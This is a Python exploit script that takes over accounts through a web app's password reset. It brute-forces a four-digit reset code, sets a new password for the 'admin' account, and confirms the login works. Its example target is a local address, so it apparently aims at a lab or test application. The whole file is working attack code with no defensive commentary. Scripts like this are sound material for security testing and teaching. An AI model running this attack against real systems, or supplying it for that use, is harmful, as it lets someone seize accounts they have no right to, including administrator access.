

import requests
import sys

def exploit_bruteforce(target_url, username, new_password):
    """
    Exploits the password reset bruteforce vulnerability.
    """
    print(f"[*] Starting password reset bruteforce for user: {username}")
    
    # Step 1: Initiate the password reset to get a valid session
    s = requests.Session()
    try:
        s.post(f"{target_url}/forgot_password", data={'username': username}, timeout=5)
        print("[*] Password reset initiated.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to connect to the target: {e}")
        return

    # Step 2: Bruteforce the 4-digit code
    for i in range(10000):
        code = str(i).zfill(4)
        
        if i % 500 == 0:
            print(f"[*] Trying code: {code}")

        reset_data = {
            'code': code,
            'new_password': new_password
        }
        
        # The vulnerable app redirects on success (302)
        r = s.post(f"{target_url}/reset_password/{username}", data=reset_data, allow_redirects=False)
        
        if r.status_code == 302:
            print(f"\n[+] Success! Code found: {code}")
            print(f"[+] Password for '{username}' has been reset to: {new_password}")
            
            # Verify login
            login_data = {'username': username, 'password': new_password}
            r_login = s.post(f"{target_url}/login", data=login_data, allow_redirects=False)
            if r_login.status_code == 302:
                print("[+] Login with new password successful!")
            else:
                print("[-] Login with new password failed.")
            return

    print("\n[-] Bruteforce failed. No valid code was found.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit_bug1.py <target_url>")
        print("Example: python exploit_bug1.py http://127.0.0.1:5000")
        sys.exit(1)
        
    TARGET_URL = sys.argv[1]
    ADMIN_USER = 'admin'
    NEW_PASSWORD = 'exploited_password_123'
    
    exploit_bruteforce(TARGET_URL, ADMIN_USER, NEW_PASSWORD)

